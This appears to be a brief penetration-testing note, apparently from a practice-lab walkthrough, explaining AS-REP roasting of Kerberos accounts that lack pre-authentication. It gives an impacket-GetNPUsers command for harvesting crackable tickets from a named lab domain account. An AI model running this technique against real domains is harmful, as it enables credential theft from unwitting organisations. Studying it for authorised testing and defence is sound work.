# ASREPRoasting

ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set.&#x20;

This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.



Get ASReproastable accounts from the Key Distribution Center (using impacket)

```bash
impacket-GetNPUsers spookysec.local/svc-admin
```

